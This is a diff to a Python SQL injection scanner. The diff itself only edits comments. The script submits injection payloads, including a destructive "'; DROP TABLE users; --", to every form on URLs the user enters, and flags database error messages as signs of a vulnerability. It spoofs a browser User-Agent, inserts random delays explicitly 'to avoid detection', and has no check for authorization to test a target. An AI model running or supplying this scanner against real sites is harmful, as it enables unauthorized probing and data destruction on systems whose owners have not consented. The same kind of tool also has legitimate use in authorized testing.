@@ -6,7 +6,6 @@ import os
 import time
 import random
 
-# Define a session to persist parameters across requests
 s = requests.Session()
 s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
 
@@ -18,7 +17,6 @@ payloads = [
     "'; DROP TABLE users; --"
 ]
 
-# 1. Function to get all forms from the given URL
 def get_forms(url):
     try:
         response = s.get(url, timeout=10)
@@ -29,7 +27,6 @@ def get_forms(url):
         print(f"[-] Error fetching forms from {url}: {e}")
         return []
 
-# 2. Extract form details, including input, textarea, select elements
 def form_details(form):
     detailsOfForm = {}
     action = form.attrs.get("action")
@@ -59,7 +56,6 @@ def form_details(form):
     detailsOfForm['inputs'] = inputs
     return detailsOfForm
 
-# 3. Check if response is vulnerable
 def vulnerable(response):
     errors = {
         "quoted string not properly terminated",
@@ -74,27 +70,24 @@ def vulnerable(response):
             return True
     return False
 
-# 4. Log vulnerabilities to CSV
+#Log vulnerabilities to CSV
 def log_vulnerability(file_name, url, form_action, payload, is_vulnerable):
     with open(file_name, "a", newline="") as f:
         writer = csv.writer(f)
         writer.writerow([url, form_action, payload, "Vulnerable" if is_vulnerable else "Not Vulnerable"])
 
-# 5. Random delay to avoid detection
+#Random delay to avoid detection
 def random_delay():
     time.sleep(random.uniform(1, 5))
 
-# 6. SQL injection scan
 def sql_injection_scan(url):
     if not valid_url(url):
         print(f"[-] Invalid URL: {url}")
         return
 
-    # Prepare file name for logging
     domain = urlparse(url).netloc.replace(".", "_")
     file_name = f"{domain}_vulnerabilities.csv"
 
-    # Initialize CSV file with headers
     if not os.path.exists(file_name):
         with open(file_name, "w", newline="") as f:
             writer = csv.writer(f)
@@ -133,12 +126,11 @@ def sql_injection_scan(url):
                 print(f"[-] Error testing payload on {action_url}: {e}")
             random_delay()
 
-# 7. Validate URL
 def valid_url(url):
     parsed = urlparse(url)
     return bool(parsed.netloc) and bool(parsed.scheme)
 
-# 8. Main function to scan URLs
+#Main function to scan URLs
 if __name__ == "__main__":
     print("Enter the URLs to scan (comma-separated):")
     urls_to_check = input().split(',')
